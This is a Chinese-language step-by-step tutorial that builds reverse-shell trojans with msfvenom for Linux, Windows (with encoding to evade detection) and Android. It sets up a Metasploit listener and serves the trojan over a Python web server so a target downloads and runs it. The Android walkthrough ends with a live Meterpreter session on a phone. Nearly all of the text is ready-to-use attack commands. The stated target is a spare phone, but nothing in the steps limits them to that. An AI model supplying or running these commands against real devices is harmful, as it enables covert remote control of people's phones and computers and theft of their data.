# 整个流程
## 木马生成

1. 在root下, 生成后门
```markdown
# Linux 后门
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=攻击机的ip LPORT=设置一个没被占用的端口(默认4444) -f elf > shell.elf

# Windows后门
msfvenom -p windows/meterpreter_reverse_tcp LHOST=监控IP (攻击机ip)LPORT=监控端口(一个没被占用的端口) -e x86/shikata_ga_nai  -f exe -o  new.exe -i 5

# 安卓后门
msfvenom -p android/meterpreter/reverse_tcp LHOST=监控IP LPORT=监控端口 R>k.apk
```
> **注意:**
> **如果生成的木马权限不够, 请在root下, 终端中输入:**

```markdown
# chmod 777 木马的文件名
chmod 777 shell.elf
```
## 配置监控

1. 启动msf 终端内输入：
```markdown
msfconsole
```

2. 载入监控模块 msf中输入： 
```markdown
use exploit/multi/handler
```

3. 加载payload , 在msf终端中输入：
```markdown
# 这个payload 就是上方木马中设置的payload, 每个操作系统的payload都不一样.
set payload linux/x64/meterpreter/reverse_tcp
```

4. 配置payload msf终端中输入：
```markdown
options
```

5. 配置payload监控IP msf终端中输入： 
```markdown
set lhost 监控IP(攻击机的ip)
set lport 木马中设置的端口
```

6. 检查payload配置 msf终端中输入：
```markdown
show options
```

7. 执行监控 msf终端中输入：
```markdown
run 

# 直接输入exploit 也可以.
```
## 攻击利用
### 将木马上传到靶机 通过python创建一个简单web服务 
```markdown
python2 -m SimpleHTTPServer 80
```
> 这一步的目的就是让对方能够下载到我们生成的木马, 攻击机的ip就相当于一个网址了


1. 在靶机上执行木马 
2. 完成攻击利用

# 实例(Android)
## 准备

1. 一台不用的安卓手机
2. 有kali系统(自带 )


![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673753545446-453d370b-b300-40f1-b011-e2b6fa2387ff.png#averageHue=%230b0706&clientId=ufaba6b11-0796-4&from=paste&height=250&id=LJoEn&originHeight=281&originWidth=687&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24878&status=done&style=none&taskId=u664590f8-1240-4de9-9e6f-12144784b9d&title=&width=610.6666666666666)
## 生成木马
```markdown
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.128 LPORT=4444 R>k.apk
```
# 

## 启动msf
```markdown
msfconsole
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673753719675-6bca3c0f-b0ab-4111-a9fb-def97e4cb8a5.png#averageHue=%23010100&clientId=ufaba6b11-0796-4&from=paste&height=43&id=u1f9f434a&originHeight=48&originWidth=447&originalType=binary&ratio=1&rotation=0&showTitle=false&size=988&status=done&style=none&taskId=u819e330b-2fd7-42ab-b5bb-02245e74c5e&title=&width=397.3333333333333)

## 使用模块
```markdown
use exploit/multi/handler
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673753765430-a97b3411-7f8e-4e6f-acaa-83230540e502.png#averageHue=%230d0907&clientId=ufaba6b11-0796-4&from=paste&height=63&id=ue4b04d9e&originHeight=71&originWidth=575&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7695&status=done&style=none&taskId=ud5269005-1f87-410d-8375-e49c33169fd&title=&width=511.1111111111111)

## 设置payload
下面的命令, 依次输入
```markdown
set payload android/meterpreter/reverse_tcp
set lhost 攻击机的ip
set lport 木马设置的port
options
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673753935740-8d188560-aac3-4b97-b93d-1d2c113ca927.png#averageHue=%230e0907&clientId=ufaba6b11-0796-4&from=paste&height=139&id=u32f931ae&originHeight=156&originWidth=678&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19597&status=done&style=none&taskId=u5832ae6a-99a9-4052-a6a6-0d730a1fdb0&title=&width=602.6666666666666)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673753969318-04f7bf35-ca16-42c4-aadc-738750b86cc1.png#averageHue=%230e0605&clientId=ufaba6b11-0796-4&from=paste&height=249&id=u2b721036&originHeight=280&originWidth=878&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15829&status=done&style=none&taskId=u5a9539bc-04bd-4508-ba0f-0e36d4848cd&title=&width=780.4444444444445)
:::warning
配置完成啦!
:::


## 开启网络传播, 让对方能下载我们的木马
1.
```markdown
python2 -m SimpleHTTPServer 80
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673756815959-4844982d-e629-4a66-b301-764a470c7bf8.png#averageHue=%23090604&clientId=ufaba6b11-0796-4&from=paste&height=70&id=u6e57f980&originHeight=79&originWidth=693&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9115&status=done&style=none&taskId=u8fbfccbc-9588-4ae1-a937-5a6a27fd387&title=&width=616)

2.打开手机浏览器, 访问自己攻击机的ip , 

![Screenshot_2023-01-15-12-33-37-03_439a3fec0400f89.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673757362746-7134395b-6734-446d-adbe-b28d35abcdf6.png#averageHue=%23b2afaf&clientId=ufaba6b11-0796-4&from=drop&id=uaf73d426&originHeight=838&originWidth=734&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82834&status=done&style=none&taskId=ue05e94ce-064f-473e-b0b3-d428d704a62&title=)
> 点击下载就可以


## 在 msf中输入
```markdown
run
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673758218464-7b79416e-d6ad-4ac6-99ea-65db1d417abe.png#averageHue=%2331333c&clientId=ufaba6b11-0796-4&from=paste&height=47&id=u03371985&originHeight=53&originWidth=825&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26070&status=done&style=none&taskId=ucde3e548-017f-482c-b7e7-c61c69089ae&title=&width=733.3333333333334)

> 可以进行手机的后渗透啦



 
